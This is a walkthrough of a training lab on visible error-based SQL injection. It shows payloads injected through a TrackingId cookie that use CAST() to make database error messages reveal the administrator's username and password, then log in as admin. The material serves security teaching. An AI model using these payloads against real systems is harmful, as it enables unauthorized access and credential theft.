### Visible error-based SQL injection : PRACTITIONER

---

Injecting a `'` in the `TrackingId` cookie returns the following error:

![error](./screenshots/err.png)

> Try adding another one to close off the opened string.

The error disappears and the application works normally.

> Since there are visible error messages, we can try to use the `CAST()` function.

The `CAST` function is used to convert to a different data type.
- Here, it converts the value `1` to integer, which should work normally:
```
ye4d0aqqHSSKqYvy' AND CAST((SELECT 1) AS INT)--
```

![error1](./screenshots/err1.png)

We get an error, as the right hand side of the `AND` operator must evaluate to a Boolean.

```
ye4d0aqqHSSKqYvy' AND CAST((SELECT 1) AS INT) = 1--
```
- Note that the `1` added at the end can be any integer.
- If it was a number other than 1 there will be no error, but if it was a character an error will be returned because characters cannot be compared with integers.

> Now that the payload is working without returning errors, we can influence errors to be returned.

Since we know that the username and password are of type string, if we cast them to an integer, an error message will be returned.
- We can use that to try and obtain the username and password of the `administrator` user.

```
' AND CAST((SELECT username FROM users LIMIT 1) AS INT)=1--
```
- If an error is returned, possible it is because the entire payload is not being read. Try truncating the payload by removing unnecessary spaces.

![err2](./screenshots/err2.png)

Now, we get as output in a verbose error message the value of the first row in the `users` table, which is the admin user.
- Now we can get the password field.

```
'AND CAST((SELECT password FROM users LIMIT 1) AS INT) = 1--
```

![err3](./screenshots/err3.png)

> Now login as admin with the given password and complete the lab.

---
